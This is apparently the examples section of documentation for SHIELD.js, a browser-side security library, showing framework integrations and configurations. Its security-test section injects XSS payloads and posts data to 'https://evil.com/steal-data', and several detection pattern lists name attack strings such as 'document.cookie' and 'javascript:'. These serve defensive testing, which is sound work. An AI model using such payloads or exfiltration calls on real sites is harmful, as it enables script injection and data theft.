# Examples

This section provides practical examples of using SHIELD.js in various scenarios and frameworks.

## Basic Examples

### Simple HTML Page Protection

```html
<!DOCTYPE html>
<html>
<head>
    <title>Protected Page</title>
    <script src="https://cdn.jsdelivr.net/npm/shield-firewall@latest/dist/shield-firewall.min.js"></script>
</head>
<body>
    <h1>My Protected Website</h1>
    <form id="contact-form">
        <input type="text" name="name" placeholder="Name">
        <input type="email" name="email" placeholder="Email">
        <textarea name="message" placeholder="Message"></textarea>
        <button type="submit">Send</button>
    </form>

    <script>
        async function initProtection() {
            const shield = new ShieldFirewall();

            await shield.configure({
                protectionLevel: 'balanced'
            });

            await shield.initialize();
            await shield.start();

            console.log('🛡️ Protection active');
        }

        initProtection();
    </script>
</body>
</html>
```

### NPM Package Usage

```javascript
// Install: npm install shield-firewall

import { ShieldFirewall } from 'shield-firewall';

async function protectApplication() {
    // Create firewall instance
    const shield = new ShieldFirewall();

    // Configure protection
    await shield.configure({
        protectionLevel: 'strict',
        features: {
            domProtection: true,
            networkInterception: true,
            behaviorAnalysis: true
        }
    });

    // Initialize and start
    await shield.initialize();
    await shield.start();

    console.log('Application protected with SHIELD.js');
}

protectApplication();
```

## Framework Integration

### React Application

```jsx
import React, { useEffect, useState } from 'react';
import { ShieldFirewall } from 'shield-firewall';

function App() {
  const [isProtected, setIsProtected] = useState(false);
  const [threats, setThreats] = useState([]);

  useEffect(() => {
    const initShield = async () => {
      const shield = new ShieldFirewall();

      // Configure for React app
      await shield.configure({
        protectionLevel: 'strict',
        threatDetection: {
          customPatterns: [
            'dangerouslySetInnerHTML',
            'eval',
            'Function'
          ]
        }
      });

      await shield.initialize();
      await shield.start();

      setIsProtected(true);

      // Listen for threats
      document.addEventListener('shield:threat-detected', (event) => {
        setThreats(prev => [...prev, event.detail]);
      });
    };

    initShield();
  }, []);

  return (
    <div className="App">
      <header>
        <h1>🛡️ Protected React App</h1>
        {isProtected && <span className="status">Protection Active</span>}
      </header>

      <main>
        <form>
          <input type="text" placeholder="Enter some text" />
          <button type="submit">Submit</button>
        </form>

        {threats.length > 0 && (
          <div className="threats">
            <h3>Detected Threats:</h3>
            <ul>
              {threats.map((threat, index) => (
                <li key={index}>
                  {threat.type}: {threat.description}
                </li>
              ))}
            </ul>
          </div>
        )}
      </main>
    </div>
  );
}

export default App;
```

### Vue.js Application

```vue
<template>
  <div id="app">
    <header>
      <h1>🛡️ Protected Vue App</h1>
      <div v-if="isProtected" class="status">Protection Active</div>
    </header>

    <main>
      <form @submit.prevent="handleSubmit">
        <input v-model="message" type="text" placeholder="Enter message">
        <button type="submit">Send</button>
      </form>

      <div v-if="threats.length" class="threats">
        <h3>Security Alerts:</h3>
        <ul>
          <li v-for="(threat, index) in threats" :key="index">
            {{ threat.type }}: {{ threat.description }}
          </li>
        </ul>
      </div>
    </main>
  </div>
</template>

<script>
import { ShieldFirewall } from 'shield-firewall';

export default {
  name: 'App',
  data() {
    return {
      isProtected: false,
      message: '',
      threats: []
    };
  },
  async mounted() {
    const shield = new ShieldFirewall();

    await shield.configure({
      protectionLevel: 'strict',
      threatDetection: {
        customPatterns: [
          'v-html.*script',
          '\\$\\{.*\\}'
        ]
      }
    });

    await shield.initialize();
    await shield.start();

    this.isProtected = true;

    // Listen for security events
    document.addEventListener('shield:threat-detected', (event) => {
      this.threats.push(event.detail);
    });
  },
  methods: {
    handleSubmit() {
      console.log('Message sent:', this.message);
      this.message = '';
    }
  }
};
</script>
```

### Angular Application

```typescript
import { Component, OnInit } from '@angular/core';
import { ShieldFirewall } from 'shield-firewall';

@Component({
  selector: 'app-root',
  template: `
    <div class="app">
      <header>
        <h1>🛡️ Protected Angular App</h1>
        <div *ngIf="isProtected" class="status">Protection Active</div>
      </header>

      <main>
        <form (ngSubmit)="onSubmit()" #contactForm="ngForm">
          <input [(ngModel)]="message" name="message" type="text" placeholder="Enter message">
          <button type="submit" [disabled]="!contactForm.form.valid">Send</button>
        </form>

        <div *ngIf="threats.length" class="threats">
          <h3>Security Alerts:</h3>
          <ul>
            <li *ngFor="let threat of threats; let i = index">
              {{ threat.type }}: {{ threat.description }}
            </li>
          </ul>
        </div>
      </main>
    </div>
  `,
  styles: [`
    .status { color: green; font-weight: bold; }
    .threats { border: 1px solid red; padding: 10px; margin: 10px 0; }
  `]
})
export class AppComponent implements OnInit {
  isProtected = false;
  message = '';
  threats: any[] = [];

  async ngOnInit() {
    const shield = new ShieldFirewall();

    await shield.configure({
      protectionLevel: 'strict',
      threatDetection: {
        customPatterns: [
          'innerHTML',
          'bypassSecurityTrust',
          'eval'
        ]
      }
    });

    await shield.initialize();
    await shield.start();

    this.isProtected = true;

    // Listen for security events
    document.addEventListener('shield:threat-detected', (event) => {
      this.threats.push(event.detail);
    });
  }

  onSubmit() {
    console.log('Message sent:', this.message);
    this.message = '';
  }
}
```

## Advanced Examples

### E-commerce Protection

```javascript
import { ShieldFirewall } from 'shield-firewall';

class EcommerceProtector {
  constructor() {
    this.shield = new ShieldFirewall();
    this.init();
  }

  async init() {
    await this.shield.configure({
      protectionLevel: 'maximum',
      features: {
        domProtection: true,
        networkInterception: true,
        behaviorAnalysis: true,
        autoRecovery: true
      },
      threatDetection: {
        sensitivity: 0.9,
        customPatterns: [
          'payment.*card',
          'credit.*number',
          'cvv',
          'expiry'
        ]
      },
      networkRules: {
        blockDataExfiltration: true,
        allowedDomains: ['api.paymentprocessor.com']
      }
    });

    await this.shield.initialize();
    await this.shield.start();

    // Protect checkout form specifically
    this.protectCheckoutForm();
  }

  protectCheckoutForm() {
    const checkoutForm = document.getElementById('checkout-form');
    if (checkoutForm) {
      // Add form-specific protection
      checkoutForm.addEventListener('submit', (e) => {
        const isValid = this.shield.validateForm(checkoutForm);
        if (!isValid) {
          e.preventDefault();
          alert('Security check failed. Please try again.');
        }
      });
    }
  }
}

// Initialize protection
new EcommerceProtector();
```

### API Client Protection

```javascript
import { ShieldFirewall } from 'shield-firewall';

class SecureApiClient {
  constructor(baseUrl, apiKey) {
    this.baseUrl = baseUrl;
    this.apiKey = apiKey;
    this.shield = new ShieldFirewall();
    this.init();
  }

  async init() {
    await this.shield.configure({
      features: {
        networkInterception: true
      },
      networkRules: {
        allowedDomains: [new URL(this.baseUrl).hostname],
        blockDataExfiltration: true
      },
      threatDetection: {
        customPatterns: [
          this.apiKey,  // Prevent API key leakage
          'authorization.*bearer',
          'token.*secret'
        ]
      }
    });

    await this.shield.initialize();
    await this.shield.start();
  }

  async request(endpoint, options = {}) {
    const url = `${this.baseUrl}${endpoint}`;
    const config = {
      ...options,
      headers: {
        'Authorization': `Bearer ${this.apiKey}`,
        'Content-Type': 'application/json',
        ...options.headers
      }
    };

    try {
      // SHIELD.js will automatically monitor this request
      const response = await fetch(url, config);

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      return await response.json();
    } catch (error) {
      console.error('API request failed:', error);
      throw error;
    }
  }

  async get(endpoint) {
    return this.request(endpoint);
  }

  async post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
}

// Usage
const api = new SecureApiClient('https://api.example.com', 'your-api-key');

async function loadUserData() {
  try {
    const user = await api.get('/user/profile');
    console.log('User data:', user);
  } catch (error) {
    console.error('Failed to load user data:', error);
  }
}
```

### Real-time Collaboration Protection

```javascript
import { ShieldFirewall } from 'shield-firewall';

class CollaborationProtector {
  constructor() {
    this.shield = new ShieldFirewall();
    this.websocket = null;
    this.init();
  }

  async init() {
    await this.shield.configure({
      protectionLevel: 'strict',
      features: {
        behaviorAnalysis: true,
        networkInterception: true
      },
      behavioralAnalysis: {
        patterns: {
          maxMessagesPerMinute: 30,  // Prevent spam
          suspiciousPatterns: [
            'repeated-content',
            'rapid-typing'
          ]
        }
      },
      threatDetection: {
        customPatterns: [
          '<script',
          'javascript:',
          'data:text/html'
        ]
      }
    });

    await this.shield.initialize();
    await this.shield.start();

    this.connectWebSocket();
  }

  connectWebSocket() {
    this.websocket = new WebSocket('wss://collaborate.example.com');

    this.websocket.onmessage = (event) => {
      const message = JSON.parse(event.data);

      // Validate incoming collaborative content
      if (this.shield.validateContent(message.content)) {
        this.handleValidMessage(message);
      } else {
        console.warn('Blocked suspicious collaborative content');
        this.reportThreat('suspicious-collaboration', message);
      }
    };
  }

  handleValidMessage(message) {
    // Process valid collaborative message
    console.log('Received valid message:', message);
    // Update UI with new content
  }

  reportThreat(type, data) {
    // Report to security monitoring
    fetch('/api/security/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, data, timestamp: Date.now() })
    });
  }

  sendMessage(content) {
    if (this.websocket && this.websocket.readyState === WebSocket.OPEN) {
      // Validate outgoing content
      if (this.shield.validateContent(content)) {
        this.websocket.send(JSON.stringify({ content, timestamp: Date.now() }));
      } else {
        alert('Message contains potentially harmful content and was blocked.');
      }
    }
  }
}

// Initialize collaboration protection
const protector = new CollaborationProtector();

// Example usage
document.getElementById('message-input').addEventListener('keypress', (e) => {
  if (e.key === 'Enter') {
    const content = e.target.value;
    protector.sendMessage(content);
    e.target.value = '';
  }
});
```

## Testing Examples

### Automated Security Testing

```javascript
import { ShieldFirewall } from 'shield-firewall';

async function runSecurityTests() {
  const shield = new ShieldFirewall();

  await shield.configure({ protectionLevel: 'strict' });
  await shield.initialize();
  await shield.start();

  const tests = [
    {
      name: 'XSS Prevention',
      test: () => {
        const div = document.createElement('div');
        div.innerHTML = '<script>alert("xss")</script>';
        document.body.appendChild(div);
      }
    },
    {
      name: 'DOM Manipulation',
      test: () => {
        const element = document.getElementById('test-element');
        element.__proto__.__proto__.innerHTML = '<script>malicious()</script>';
      }
    },
    {
      name: 'Network Interception',
      test: () => {
        fetch('https://evil.com/steal-data', {
          method: 'POST',
          body: JSON.stringify({ sensitive: 'data' })
        });
      }
    }
  ];

  for (const testCase of tests) {
    console.log(`Running test: ${testCase.name}`);
    try {
      await testCase.test();
      console.log(`✅ ${testCase.name} completed`);
    } catch (error) {
      console.log(`❌ ${testCase.name} failed:`, error.message);
    }
  }

  // Check threat log
  const threats = shield.getThreatLog();
  console.log(`Detected ${threats.length} threats during testing`);
}

// Run security tests
runSecurityTests();
```

## Configuration Examples

### High-Security Configuration

```javascript
const highSecurityConfig = {
  protectionLevel: 'maximum',
  features: {
    domProtection: true,
    networkInterception: true,
    behaviorAnalysis: true,
    predictiveDetection: true,
    autoRecovery: true,
    realTimeMonitoring: true
  },
  threatDetection: {
    sensitivity: 0.95,
    customPatterns: [
      'script.*alert',
      'javascript:',
      'onerror.*eval',
      'document\\.cookie',
      'localStorage',
      'sessionStorage',
      'eval\\(',
      'Function\\(',
      'setTimeout.*string',
      'setInterval.*string'
    ]
  },
  behavioralAnalysis: {
    patterns: {
      maxClicksPerSecond: 5,
      maxFormSubmissionsPerMinute: 2,
      maxNavigationChangesPerMinute: 10
    }
  }
};
```

### Performance-Optimized Configuration

```javascript
const performanceConfig = {
  protectionLevel: 'balanced',
  features: {
    domProtection: true,
    networkInterception: true,
    behaviorAnalysis: false,  // Disabled for performance
    predictiveDetection: false,  // Disabled for performance
    autoRecovery: true,
    realTimeMonitoring: false  // Disabled for performance
  },
  threatDetection: {
    sensitivity: 0.7,
    customPatterns: [
      'script.*alert',
      'javascript:',
      'eval\\('
    ]
  }
};
```